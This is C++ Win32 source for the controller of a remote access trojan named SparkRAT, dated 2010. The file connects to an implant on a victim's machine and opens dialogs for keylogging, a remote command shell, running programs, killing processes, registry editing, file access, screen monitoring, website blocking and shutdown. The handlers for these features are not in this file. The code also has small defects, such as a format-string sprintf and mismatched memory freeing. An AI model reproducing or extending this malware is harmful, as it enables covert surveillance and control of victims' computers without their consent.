/*
 * SparkRAT 0.Incomplete Client (Controller)
 * by Sparky
 * Copyright(C) 2010
 */

#include "procs.h"

extern BOOL g_bKeyed; // change when disconnected

HINSTANCE hInst = NULL;
WSADATA wsaData;
SOCKET sockConnect = INVALID_SOCKET;
BOOL bConnected = FALSE;
BOOL bConnect = TRUE; // for main dialog connect button(TRUE = "Connect", FALSE = "Disconnect")
BOOL bContinueWait = TRUE;
HWND hDialog = NULL, hStatusBar = NULL;
HWND hWindows[32] = {NULL};
char szHost[256] = {0};

DWORD WINAPI _connect_server(LPVOID lpBuffer)
{
    HWND hEditPort   = GetDlgItem(hDialog, IDC_EDT_PORT);
    HWND hEditStatus = GetDlgItem(hDialog, IDC_EDT_STATUS);
    LPSTR lpPort = (LPSTR)LocalAlloc(GPTR, 128);
    char buf[256] = {0};
    addrinfo *result = NULL, *ptr = NULL, hints;
    bContinueWait = TRUE;

    /* Get the port */
    int len = GetWindowTextLength(hEditPort);
    if(len <= 0)
    {
        ErrMsg("Enter a port");
        GlobalFree((HANDLE)lpPort);
        bConnected = FALSE;
        bContinueWait = FALSE;
        ExitThread(0);
    }
    GetWindowText(hEditPort, lpPort, len + 1);

    /* Start winsock 2.2 */
    int iRes = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if(iRes != 0){
          wsprintf(buf, "ERROR Initializing Winsock 2.2: %d", iRes);
          SetWindowText(hEditStatus, buf);
          cleanup();
          LocalFree((HANDLE)lpPort);
          bConnected = FALSE;
          bContinueWait = FALSE;
          ExitThread(0);
    }

    /* Setup the hints structure */
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    /* resolve server address and port */
    iRes = getaddrinfo(szHost, lpPort, &hints, &result);
    if(iRes != 0)
    {
        wsprintf(buf, "ERROR getaddrinfo() returned %d", iRes);
        SetWindowText(hEditStatus, buf);
        cleanup();
        LocalFree((HANDLE)lpPort);
        bConnected = FALSE;
        bContinueWait = FALSE;
        ExitThread(0);
    }

    /* create the socket for connection */
    ptr = result;
    sockConnect = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if(sockConnect == INVALID_SOCKET)
    {
        wsprintf(buf, "ERROR socket() failed: %d", WSAGetLastError());
        SetWindowText(hEditStatus, buf);
        cleanup();
        LocalFree((HANDLE)lpPort);
        bConnected = FALSE;
        bContinueWait = FALSE;
        ExitThread(0);
    }

    /* connect to the server */
    iRes = connect(sockConnect, ptr->ai_addr, (int)ptr->ai_addrlen);
    if(iRes == SOCKET_ERROR)
    {
        wsprintf(buf, "ERROR connect() failed: %d", WSAGetLastError());
        SetWindowText(hEditStatus, buf);
        cleanup();
        LocalFree((HANDLE)lpPort);
        bConnected = FALSE;
        bContinueWait = FALSE;
        ExitThread(0);
    }

    /* connection successful */
    char szBuffer[256];
    sprintf(szBuffer, "Connected to %s", szHost);
    SetWindowText(hEditStatus, szBuffer);
    LocalFree((HANDLE)lpPort);
    bConnected = TRUE;

    for(int i=3999; i<4029; ++i)
    {
        packet_t packet, recvpacket;
        packet.type = i;
        while(send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0) == SOCKET_ERROR)
            Sleep(200);

        recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
    }

    ExitThread(0);
}

DWORD WINAPI _wait_connect(LPVOID lpBuffer)
{
    HWND hBtnConnect = GetDlgItem(hDialog, IDC_BTN_CONNECT);
    HWND hBtnVerify  = GetDlgItem(hDialog, IDC_BTN_VERIFY);

    /* create connection thread */
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_connect_server, 0, 0, 0);

    SetWindowText(hBtnConnect, "Connecting...");
    EnableWindow(hBtnConnect, FALSE);

    /* wait for result from connection thread */
    for(;;)
    {
        if(bConnected)
        {
            bConnect = FALSE;
            EnableWindow(hBtnVerify, TRUE);
            SetWindowText(hBtnConnect, "Disconnect");
            break;
        }
        else if(!bContinueWait)
        {
            bConnect = TRUE;
            EnableWindow(hBtnVerify, FALSE);
            SetWindowText(hBtnConnect, "Connect");
            break;
        }

        Sleep(10);
    }
    EnableWindow(hBtnConnect, TRUE);

    ExitThread(0);
}

DWORD WINAPI _verify(LPVOID lpBuffer)
{
    packet_t packet, recvPacket;
    packet.type = PACKET_VERIFY;
    HWND hEditStatus = GetDlgItem(hDialog, IDC_EDT_STATUS);
    HWND hBtnConnect = GetDlgItem(hDialog, IDC_BTN_CONNECT);
    HWND hBtnVerify  = GetDlgItem(hDialog, IDC_BTN_VERIFY);
    char szMsg[256];
    int iRes = 0;

    SetWindowText(hBtnVerify, "Verifying...");
    EnableWindow(hBtnVerify, FALSE);

    while(iRes = send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0) == SOCKET_ERROR)
        Sleep(1000);

    if(iRes == SOCKET_ERROR)
    {
        /* reset all controls to default */
        sprintf(szMsg, "ERROR send() returned %d", iRes);
        SetStatusBar(szMsg);
        SetWindowText(hEditStatus, "Disconnected");
        cleanup();
        EnableWindow(hBtnVerify, FALSE);
        bConnect = TRUE;
        bConnected = FALSE;
        SetWindowText(hBtnConnect, "Connect");
        SetWindowText(hBtnVerify, "Verify");
        EnableWindow(hBtnVerify, TRUE);
        ExitThread(0);
    }

    Sleep(100);

    iRes = recv(sockConnect, (LPSTR)&recvPacket, sizeof(packet_t), 0);
    if(iRes > 0) // if any data was received
    {
        if(recvPacket.type == PACKET_VERIFY)
        {
            SetWindowText(hBtnVerify, "Verify");
            sprintf(szMsg, "Connection verified. Received %d bytes", iRes);
            SetWindowText(hStatusBar, szMsg);
            EnableWindow(hBtnVerify, TRUE);
            ExitThread(0);
        }
    }
    else if(iRes == 0) // if disconnected
    {
        SetWindowText(hBtnConnect, "Connect");
        SetWindowText(hBtnVerify, "Verify");
        SetWindowText(hEditStatus, "Disconnected");
        SetStatusBar("Connection closed. recv() returned 0");
        cleanup();
        EnableWindow(hBtnVerify, FALSE);
        bConnect = TRUE;
        ExitThread(0);
    }
    else if(iRes < 0) // if error receiving data
    {
        sprintf(szMsg, "ERROR recv() returned %d : WSAGetLastError(): %d", iRes, WSAGetLastError());
        SetStatusBar(szMsg);
        SetWindowText(hEditStatus, "Disconnected");
        cleanup();
        EnableWindow(hBtnVerify, FALSE);
        bConnect = TRUE;
        SetWindowText(hBtnConnect, "Connect");
        SetWindowText(hBtnVerify, "Verify");
    }

    ExitThread(0);
}

void CreateStatusBar()
{
    /* This will also create a resizing corner control which cannot be used (side effect) */
    INITCOMMONCONTROLSEX iccx;
    iccx.dwSize = sizeof(INITCOMMONCONTROLSEX);
    iccx.dwICC = ICC_WIN95_CLASSES | ICC_BAR_CLASSES | ICC_LISTVIEW_CLASSES | ICC_USEREX_CLASSES;
    InitCommonControlsEx(&iccx); // this will also enable visual theming (required)

    hStatusBar = CreateWindowEx(0,
                                STATUSCLASSNAME,
                                0,
                                SBARS_SIZEGRIP | WS_CHILD | WS_VISIBLE,
                                0,
                                0,
                                0,
                                0,
                                hDialog,
                                reinterpret_cast<HMENU>(static_cast<INT_PTR>(DLG_MAIN_IDC_STATUS)),
                                hInst,
                                0);

    SetWindowLongPtr(hDialog, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(hStatusBar));

    SendMessage(hStatusBar, SB_SETTEXT, 0, reinterpret_cast<LPARAM>(TEXT("Welcome to SparkRAT")));
}

BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditHost          = GetDlgItem(hwnd, IDC_EDT_HOST);
    HWND hEditPort          = GetDlgItem(hwnd, IDC_EDT_PORT);
    HWND hEditStatus        = GetDlgItem(hwnd, IDC_EDT_STATUS);
    HWND hBtnConnect        = GetDlgItem(hwnd, IDC_BTN_CONNECT);
    HWND hBtnVerify         = GetDlgItem(hwnd, IDC_BTN_VERIFY);

    char buf[256] = {0};
    int len = 0;

    switch(msg)
    {
        case WM_INITDIALOG:
            SetWindowText(hEditHost, "127.0.0.1");
            SetWindowText(hEditPort, DEF_PORT);
            SetWindowText(hEditStatus, "Disconnected");
            EnableWindow(hBtnVerify, FALSE);
            hDialog = hwnd;

            /* Load the menu */
            HMENU hMenu = LoadMenu(hInst, MAKEINTRESOURCE(IDR_MENU));
            SetMenu(hwnd, hMenu);

            /* Set the icon */
            SendMessage(hwnd, WM_SETICON, ICON_SMALL,
             (LPARAM)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_MAIN), IMAGE_ICON, 0, 0, LR_DEFAULTCOLOR));

            CreateStatusBar();
            return TRUE;

        case WM_CLOSE:
            for(int i=0; i<32; ++i)
                DestroyWindow(hWindows[i]);

            EndDialog(hwnd, 0);
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case IDR_FILE_QUIT:
                    for(int i=0; i<32; ++i)
                        DestroyWindow(hWindows[i]);

                    EndDialog(hwnd, 0);
                    break;

                case IDR_HELP_ABOUT:
                    MessageBox(NULL,
                        "SparkRAT Client 0.5\n\n"
                        "By Sparky Copyright(C) 2010\n"
                        "For help see README.TXT",
                        "About",
                        MB_ICONINFORMATION);
                    break;

                case IDC_BTN_CONNECT:
                    {
                        if(bConnect)
                        {
                            len = GetWindowTextLength(hEditHost);
                            if(len <= 0)
                            {
                                ErrMsg("Invalid host length");
                                break;
                            }
                            GetWindowText(hEditHost, buf, len + 1);

                            sprintf(szHost, buf);
                            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_wait_connect, 0, 0, 0);
                        }
                        else
                        {
                            packet_t packet;
                            packet.type = PACKET_DISCONNECT;

                            /* tell server to disconnect and listen again */
                            send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                            /* reset all controls to default */
                            SetWindowText(hEditStatus, "Disconnected");
                            cleanup();
                            bConnect = TRUE;
                            bConnected = FALSE;
                            EnableWindow(hBtnVerify, FALSE);
                            SetWindowText(hBtnConnect, "Connect");
                            SetWindowText(hBtnVerify, "Verify");
                        }
                    }
                    break;

                case IDC_BTN_VERIFY:
                    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_verify, 0, 0, 0);
                    break;

                case IDC_BTN_BEEP:
                    if(hWindows[HWND_BEEP] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_BEEP), NULL, DlgBeepProc);
                    else
                        SetFocus(hWindows[HWND_BEEP]);
                    break;

                case IDC_BTN_MESSAGE:
                    if(hWindows[HWND_MSG] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_MSG), NULL, DlgMsgProc);
                    else
                        SetFocus(hWindows[HWND_MSG]);
                    break;

                case IDC_BTN_CMD:
                    if(hWindows[HWND_CMD] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_CMD), NULL, DlgCmdProc);
                    else
                        SetFocus(hWindows[HWND_CMD]);
                    break;

                case IDC_BTN_RUN:
                    if(hWindows[HWND_RUN] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_RUN), NULL, DlgRunProc);
                    else
                        SetFocus(hWindows[HWND_RUN]);
                    break;

                case IDC_BTN_SHUTDOWN:
                    if(hWindows[HWND_SDOWN] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_SHUTDOWN), NULL, DlgShutdownProc);
                    else
                        SetFocus(hWindows[HWND_SDOWN]);
                    break;

                case IDC_BTN_MONITOR:
                    if(hWindows[HWND_MON] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_MON), NULL, DlgMonitorProc);
                    else
                        SetFocus(hWindows[HWND_MON]);
                    break;

                case IDC_BTN_REG:
                    if(hWindows[HWND_REG] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_REG), NULL, DlgRegProc);
                    else
                        SetFocus(hWindows[HWND_REG]);
                    break;

                case IDC_BTN_KEY:
                    if(hWindows[HWND_KEY] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_KEY), NULL, DlgKeyProc);
                    else
                        SetFocus(hWindows[HWND_KEY]);
                    break;

                case IDC_BTN_KILLPROC:
                    if(hWindows[HWND_KILL] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_KILL), NULL, DlgKillProc);
                    else
                        SetFocus(hWindows[HWND_KILL]);
                    break;

                case IDC_BTN_FILES:
                    if(hWindows[HWND_FILES] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_FILES), NULL, DlgFilesProc);
                    else
                        SetFocus(hWindows[HWND_FILES]);
                    break;

                case IDC_BTN_FUN:
                    if(hWindows[HWND_FUN] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_FUN), NULL, DlgFunProc);
                    else
                        SetFocus(hWindows[HWND_FUN]);
                    break;

                case IDC_BTN_BLOCKWEB:
                    if(hWindows[HWND_BLOCKWEB] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_BLOCKWEB), NULL, DlgBlockWebProc);
                    else
                        SetFocus(hWindows[HWND_BLOCKWEB]);
                    break;

                case IDC_BTN_VOICE:
                    if(hWindows[HWND_VOICE] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_VOICE), NULL, DlgVoiceProc);
                    else
                        SetFocus(hWindows[HWND_VOICE]);
                    break;

                case IDC_BTN_CHAT:
                    if(hWindows[HWND_CHAT] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_CHAT), NULL, DlgChatProc);
                    else
                        SetFocus(hWindows[HWND_CHAT]);
                    break;

                case IDC_BTN_DISPLAY:
                    if(hWindows[HWND_DISP] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_DISP), NULL, DlgDisplayProc);
                    else
                        SetFocus(hWindows[HWND_DISP]);
                    break;

                case IDC_BTN_PRINT:
                    if(hWindows[HWND_PRINT] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_PRINT), NULL, DlgPrintProc);
                    else
                        SetFocus(hWindows[HWND_PRINT]);
                    break;


                //---
                case IDC_BTN_UNINST:
                    if(hWindows[HWND_UNINST] == NULL)
                        DialogBox(hInst, MAKEINTRESOURCE(DLG_UNINST), NULL, DlgUninstProc);
                    else
                        SetFocus(hWindows[HWND_UNINST]);
                    break;
            }
            return TRUE;
    }

    return FALSE;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    hInst = hInstance;

    // The user interface is a modal dialog box
    return DialogBox(hInstance, MAKEINTRESOURCE(DLG_MAIN), NULL, DialogProc);
}
